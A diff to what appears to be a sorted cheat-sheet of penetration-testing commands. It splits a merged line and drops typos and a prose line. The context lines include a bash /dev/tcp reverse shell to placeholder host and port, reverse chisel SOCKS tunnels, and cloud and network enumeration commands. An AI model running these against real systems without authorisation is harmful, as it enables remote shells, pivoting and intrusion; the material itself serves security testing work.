@@ -134,7 +134,9 @@ aws s3 iam get-user --user-name $USERaz storage -h
 aws s3 iam list-users
 aws s3 ls s3://mybucket
 az vm create -h
-az vm show -g WebPropertiesRG -n Bizlogicbettercap -iface eth0binwalk -e image.pngblackbird.py -u username
+az vm show -g WebPropertiesRG -n Bizlogicbettercap -iface eth0
+binwalk -e image.png
+blackbird.py -u username
 base64 -w 0 file
 bash -i >& /dev/tcp/<lhost>/<lport> 0>&1
 bash bloodhound-customqueries-downloader
@@ -347,7 +349,6 @@ cat nmap_udp.nmap | grep open | grep -v filtered
 cat nmap_udp.nmap | grep open | grep -v filtered | sort -u
 cat nmap_udp.nmap | grep open | grep -v filtered | sort -u | cut -d '/' -f 1 | sort -u
 cat nmap_udp.nmap | grep open | grep -v filtered | sort -u | cut -d '/' -f 1 | sort -u | tr '\n' ','
-cat nmap_udp.nmap | grep open | grep -v filtered | sort -y
 cat nuclei.txt
 cat nuclei.txt | grep -i basic
 cat nuclei.txt | grep basic-auth-detect
@@ -485,8 +486,6 @@ chisel client <server_ip>:<server_port> R:socks
 chisel server -p $PORT --socks5 --reverse
 chisel server -v -p <server_port|8000> --reverse
 clear
-cleqr
-Client or Server can also be launch on windows with chisel.exe
 cloudmapper.py collect --account parent --profile parent
 cloudmapper.py configure add-account --config-file config.json --name parent --id XXX --default true
 cloudmapper.py configure discover-organization-accounts
